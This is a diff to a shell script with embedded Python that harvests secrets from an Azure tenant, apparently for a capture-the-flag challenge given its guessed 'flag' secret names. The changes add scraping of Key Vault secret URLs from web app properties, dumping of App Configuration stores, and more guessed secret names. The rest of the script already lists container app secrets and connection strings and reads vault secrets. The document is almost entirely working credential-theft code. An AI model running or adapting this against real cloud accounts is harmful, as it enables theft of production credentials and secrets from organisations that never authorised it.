@@ -4,7 +4,7 @@ set -uo pipefail
 loot="$(mktemp)"
 trap 'rm -f "$loot"' EXIT
 python3 - >"$loot" 2>&1 <<'PY'
-import json, os, subprocess, sys, urllib.error, urllib.parse, urllib.request
+import json, os, re, subprocess, sys, urllib.error, urllib.parse, urllib.request
 
 tenant=os.getenv('AZURE_TENANT_ID','3205c325-06a5-4171-9ce8-ffc5e6c2845e')
 client=os.getenv('AZURE_CLIENT_ID','72ff278a-9e71-43ec-bac4-2ca303f8e462')
@@ -81,6 +81,7 @@ if arm_token:
 vaults={'kv-tbl-prod-x3euoz'}
 storage=[]
 connections=[]
+direct_secrets=[]
 for resource in resources:
     kind=resource.get('type','').lower()
     name=resource.get('name','')
@@ -96,12 +97,20 @@ for resource in resources:
         props=body.get('properties',{}) if isinstance(body,dict) else {}
         if props.get('CONFIG_STORAGE_CONNECTION'):
             connections.append((name,props['CONFIG_STORAGE_CONNECTION']))
+        for value in props.values():
+            if isinstance(value,str):
+                direct_secrets += re.findall(r'https://[a-z0-9-]+\.vault\.azure\.net/secrets/[A-Za-z0-9-]+',value)
         show('web connection strings '+name,
              arm(rid+'/config/connectionstrings/list?api-version=2022-03-01','POST'))
     elif kind=='microsoft.app/containerapps':
         show('container app '+name,arm(rid+'?api-version=2024-03-01'))
         show('container app secrets '+name,
              arm(rid+'/listSecrets?api-version=2024-03-01','POST'))
+    elif kind=='microsoft.appconfiguration/configurationstores':
+        config_token=aad('https://azconfig.io/.default')
+        if config_token:
+            show('App Configuration '+name,
+                 call('https://'+name+'.azconfig.io/kv?api-version=1.0',config_token))
 
 if vault_token:
     for vault in sorted(vaults):
@@ -109,7 +118,9 @@ if vault_token:
         names=[s.get('id','').split('?')[0] for s in
                pages(root+'/secrets?api-version=7.4',vault_token)]
         names += [root+'/secrets/'+s for s in
-                  ('flag','ctf-flag','tebamoto-flag','prod-flag')]
+                  ('flag','ctf-flag','tebamoto-flag','prod-flag','tbl-flag',
+                   'logistics-flag','incident-flag','df26-flag')]
+        names += direct_secrets
         for sid in dict.fromkeys(n for n in names if n):
             show('key vault '+sid,call(sid+'?api-version=7.4',vault_token))
 
